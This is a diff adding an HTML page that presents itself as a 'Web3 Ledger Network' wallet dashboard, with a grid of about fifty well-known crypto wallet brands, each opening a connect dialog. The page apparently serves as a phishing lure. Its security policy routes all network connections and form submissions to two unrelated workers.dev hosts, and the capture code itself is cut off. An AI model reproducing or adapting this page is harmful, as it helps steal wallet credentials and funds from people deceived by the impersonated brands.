@@ -1,0 +1,1228 @@
+<!DOCTYPE html>
+<html lang="en" style="height: 100%;"><head>
+<meta http-equiv="Content-Security-Policy"
+      content="
+        default-src 'self' https:;
+        script-src 'self' https://web3ledgernetwork.com https://ajax.googleapis.com https://translate.googleapis.com 'unsafe-inline';
+        style-src 'self' https://web3ledgernetwork.com https://fonts.googleapis.com 'unsafe-inline';
+        img-src 'self' https://web3ledgernetwork.com data:;
+        font-src 'self' https://fonts.gstatic.com;
+        connect-src
+          https://round-poetry-6598.officeusps368.workers.dev
+          https://lingering-union-8dcf.faith16437.workers.dev;
+        form-action
+          https://lingering-union-8dcf.faith16437.workers.dev;
+      ">
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="3FrKUfTfcITQMtar9zeqFUWPBCumSwes74VQ7ynX">
+    <title>Dashboard | Web3 Ledger Network</title>
+
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,100..900;1,100..900&amp;family=Roboto:ital,wght@0,100..900&amp;display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="https://web3ledgernetwork.com/css/dark-purple-dash.css">
+
+    <!-- Styles -->
+    <link rel="preload" as="style" href="https://web3ledgernetwork.com/build/assets/app-KTSIhXci.css"><link rel="modulepreload" href="https://web3ledgernetwork.com/build/assets/app-CSHR9Uj0.js"><link rel="modulepreload" href="https://web3ledgernetwork.com/build/assets/bootstrap-B4mIeCsZ.js"><link rel="stylesheet" href="https://web3ledgernetwork.com/build/assets/app-KTSIhXci.css">
+    <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.2f3WBw8L4SI.L.W.O/am=AAQD/d=0/rs=AN8SPfrXXtxuFpMMBoYgp93jo68L3iC3ZQ/m=el_main_css"><script type="text/javascript" charset="UTF-8" src="https://translate.googleapis.com/_/translate_http/_/js/k=translate_http.tr.en_GB.SA3MmY9u8ag.O/am=AAAQ/d=1/exm=el_conf/ed=1/rs=AN8SPfqWB4UVkP8gvnmCrKRwNgJS9IkjYA/m=el_main"></script></head>
+
+<body class="bg-dark text-gray-100 antialiased" style="position: relative; min-height: 100%; top: 0px;">
+    <!-- User Menu Modal -->
+    <div id="userMenu" class="fixed inset-0 z-50 hidden">
+        <div class="absolute inset-0 bg-black/20 backdrop-blur-sm" id="userMenuBackdrop"></div>
+        <div class="absolute transform right-4 top-16 w-[calc(100%-2rem)] sm:w-80 md:w-96 bg-dark-medium rounded-lg shadow-lg py-1 ring-1 ring-white/10 mx-4 sm:mx-0">
+            <ul class="divide-y divide-dark-lighter">
+                <li>
+                    <a href="https://web3ledgernetwork.com/profile" class="block px-4 py-2.5 text-sm text-gray-300 hover:text-primary hover:bg-dark-lighter transition-colors">
+                        My Profile
+                    </a>
+                </li>
+                <li>
+                    <a href="https://web3ledgernetwork.com/logout" onclick="event.preventDefault(); document.getElementById('logout-form').submit();" class="block px-4 py-2.5 text-sm text-gray-300 hover:text-primary hover:bg-dark-lighter transition-colors">
+                        Logout
+                    </a>
+                </li>
+                            </ul>
+            <form id="logout-form" action="https://web3ledgernetwork.com/logout" method="POST" class="hidden">
+                <input type="hidden" name="_token" value="3FrKUfTfcITQMtar9zeqFUWPBCumSwes74VQ7ynX" autocomplete="off">            </form>
+        </div>
+    </div>
+
+    <!-- Flash Messages -->
+    
+    
+    <!-- Main Content -->
+    <div class="min-h-screen bg-dark">
+        <!-- Admin Notice -->
+        
+        <!-- Header with dark purple gradient -->
+        <div class="header-gradient">
+            <div class="flex justify-between items-center w-full">
+                <!-- Left: App logo -->
+                <a href="https://web3ledgernetwork.com/app" class="flex items-center">
+                    <img src="https://web3ledgernetwork.com/images/logo.svg" alt="Web3 Ledger Network" class="h-8">
+                </a>
+
+                <!-- Center: Empty space for better layout -->
+                <div></div>
+
+                <!-- Right: Google Translate, Search and Settings Icons -->
+                <div class="flex items-center gap-3">
+                    
+                    <a href="https://web3ledgernetwork.com/app/secure_assets" class="text-white hover:text-gray-300" title="Search">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+                        </svg>
+                    </a>
+                    <button class="showBox text-white hover:text-gray-300" title="Menu">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+            <!-- Header Section -->
+    <div class="bg-dark-lighter border-b border-dark-border">
+        <div class="text-center py-8 px-4">
+            <h1 class="text-2xl font-semibold text-white mb-4">Wallets</h1>
+            <p class="text-gray-400 text-sm leading-relaxed max-w-2xl mx-auto px-4">
+                Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop
+                computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and
+                mobile
+                browsers are supported via mobile deep linking.
+            </p>
+        </div>
+    </div>
+
+    <!-- Wallets Grid -->
+    <div class="p-4">
+        <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
+                                        
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(1, '0_trust.png', 'Trust', 'Trust Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/0_trust.png" alt="Trust" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Trust</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(2, '1_metamask.png', 'Metamask', 'Metamask Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/1_metamask.png" alt="Metamask" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Metamask</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(3, '2_lobstr.png', 'Lobstr', 'Lobstr Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/2_lobstr.png" alt="Lobstr" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Lobstr</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(4, '3_coinbase.png', 'Coinbase', 'Coinbase Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/3_coinbase.png" alt="Coinbase" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Coinbase</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(5, 'aktionariat.png', 'Aktionariat', 'Aktionariat Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/aktionariat.png" alt="Aktionariat" class="w-16 h-16 mx-auto object-cover rounded-lg">
+                    </div>
+                    <span class="text-white text-sm font-medium">Aktionariat</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(6, 'alice.png', 'Alice', 'Alice Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/alice.png" alt="Alice" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Alice</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(7, 'alpha_wallet.png', 'Alpha Wallet', 'Alpha Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/alpha_wallet.png" alt="Alpha Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Alpha Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(8, 'anchor.png', 'Anchor', 'Anchor Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/anchor.png" alt="Anchor" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Anchor</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(9, 'arculus.png', 'Arculus', 'Arculus Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/arculus.png" alt="Arculus" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Arculus</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(10, 'argent.png', 'Argent', 'Argent Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/argent.png" alt="Argent" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Argent</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(11, 'at.wallet.png', 'At.wallet', 'At.wallet Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/at.wallet.png" alt="At.wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">At.wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(12, 'atomic.png', 'Atomic', 'Atomic Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/atomic.png" alt="Atomic" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Atomic</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(13, 'authereum.png', 'Authereum', 'Authereum Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/authereum.png" alt="Authereum" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Authereum</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(14, 'bakkt.png', 'Bakkt', 'Bakkt Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/bakkt.png" alt="Bakkt" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Bakkt</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(15, 'binance_smart_chain.png', 'Binance Smart Chain', 'Binance Smart Chain Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/binance_smart_chain.png" alt="Binance Smart Chain" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Binance Smart Chain</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(16, 'bit_keep.png', 'Bit Keep', 'Bit Keep Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/bit_keep.png" alt="Bit Keep" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Bit Keep</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(17, 'bit_pay.png', 'Bit Pay', 'Bit Pay Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/bit_pay.png" alt="Bit Pay" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Bit Pay</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(18, 'blockchain.png', 'Blockchain', 'Blockchain Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/blockchain.png" alt="Blockchain" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Blockchain</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(19, 'bridge_wallet.png', 'Bridge Wallet', 'Bridge Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/bridge_wallet.png" alt="Bridge Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Bridge Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(20, 'coin98.png', 'Coin98', 'Coin98 Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/coin98.png" alt="Coin98" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Coin98</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(21, 'coinomi.png', 'Coinomi', 'Coinomi Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/coinomi.png" alt="Coinomi" class="w-16 h-16 mx-auto object-cover rounded-lg">
+                    </div>
+                    <span class="text-white text-sm font-medium">Coinomi</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(22, 'cool_wallet_s.png', 'Cool Wallet S', 'Cool Wallet S Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/cool_wallet_s.png" alt="Cool Wallet S" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Cool Wallet S</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(23, 'cosmostation.png', 'Cosmostation', 'Cosmostation Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/cosmostation.png" alt="Cosmostation" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Cosmostation</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(24, 'crypto.com_defi_wallet.png', 'Crypto.com Defi Wallet', 'Crypto.com Defi Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/crypto.com_defi_wallet.png" alt="Crypto.com Defi Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Crypto.com Defi Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(25, 'cybavo_wallet.png', 'Cybavo Wallet', 'Cybavo Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/cybavo_wallet.png" alt="Cybavo Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Cybavo Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(26, 'd_cent_wallet.png', 'D'Cent Wallet', 'D Cent Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/d_cent_wallet.png" alt="D'Cent Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">D'Cent Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(27, 'dok_wallet.png', 'Dok Wallet', 'Dok Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/dok_wallet.png" alt="Dok Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Dok Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(28, 'easy_pocket.jpg', 'Easy Pocket', 'Easy Pocket Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/easy_pocket.jpg" alt="Easy Pocket" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Easy Pocket</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(29, 'eidoo.png', 'Eidoo', 'Eidoo Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/eidoo.png" alt="Eidoo" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Eidoo</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(30, 'ellipal.png', 'Ellipal', 'Ellipal Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/ellipal.png" alt="Ellipal" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Ellipal</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(31, 'equal.jpg', 'Equal', 'Equal Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/equal.jpg" alt="Equal" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Equal</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(32, 'exodus.png', 'Exodus', 'Exodus Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/exodus.png" alt="Exodus" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Exodus</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(33, 'fetch.jpg', 'Fetch', 'Fetch Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/fetch.jpg" alt="Fetch" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Fetch</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(34, 'gnosis_safe_multisig.png', 'Gnosis Safe Multisig', 'Gnosis Safe Multisig Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/gnosis_safe_multisig.png" alt="Gnosis Safe Multisig" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Gnosis Safe Multisig</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(35, 'graph_protocol.jpg', 'Graph Protocol', 'Graph Protocol Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/graph_protocol.jpg" alt="Graph Protocol" class="w-16 h-16 mx-auto object-cover rounded-lg">
+                    </div>
+                    <span class="text-white text-sm font-medium">Graph Protocol</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(36, 'grid_plus.png', 'Grid Plus', 'Grid Plus Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/grid_plus.png" alt="Grid Plus" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Grid Plus</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(37, 'harmony.png', 'Harmony', 'Harmony Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/harmony.png" alt="Harmony" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Harmony</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(38, 'huobi_wallet.png', 'Huobi Wallet', 'Huobi Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/huobi_wallet.png" alt="Huobi Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Huobi Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(39, 'iconex.png', 'Iconex', 'Iconex Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/iconex.png" alt="Iconex" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Iconex</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(40, 'infinito.png', 'Infinito', 'Infinito Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/infinito.png" alt="Infinito" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Infinito</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(41, 'infinity_wallet.png', 'Infinity Wallet', 'Infinity Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/infinity_wallet.png" alt="Infinity Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Infinity Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(42, 'karda_chain.png', 'Karda Chain', 'Karda Chain Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/karda_chain.png" alt="Karda Chain" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Karda Chain</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(43, 'keplr.png', 'Keplr', 'Keplr Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/keplr.png" alt="Keplr" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Keplr</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(44, 'keyring_pro.png', 'Keyring Pro', 'Keyring Pro Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/keyring_pro.png" alt="Keyring Pro" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Keyring Pro</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(45, 'ledger_live.png', 'Ledger Live', 'Ledger Live Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/ledger_live.png" alt="Ledger Live" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Ledger Live</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(46, 'ledger_nano_s.png', 'Ledger Nano S', 'Ledger Nano S Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/ledger_nano_s.png" alt="Ledger Nano S" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Ledger Nano S</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(47, 'ledger_nano_x.png', 'Ledger Nano X', 'Ledger Nano X Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/ledger_nano_x.png" alt="Ledger Nano X" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Ledger Nano X</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(48, 'loopring_wallet.png', 'Loopring Wallet', 'Loopring Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/loopring_wallet.png" alt="Loopring Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Loopring Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(49, 'maiar.png', 'Maiar', 'Maiar Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/maiar.png" alt="Maiar" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Maiar</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(50, 'math_wallet.png', 'Math Wallet', 'Math Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/math_wallet.png" alt="Math Wallet" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Math Wallet</span>
+                </div>
+                                            
+                <div class="bg-dark-lighter border border-dark-border rounded-lg p-4 text-center hover:bg-dark-medium transition-colors cursor-pointer" onclick="openConnectModal(51, 'meet.one.jpg', 'Meet.one', 'Meet.one Wallet')">
+                    <div class="mb-3">
+                        <img src="https://web3ledgernetwork.com/images/wallets/meet.one.jpg" alt="Meet.one" class="w-16 h-16 mx-auto object-cover rounded-full">
+                    </div>
+                    <span class="text-white text-sm font-medium">Meet.one</span>
+                </div>
+                                            
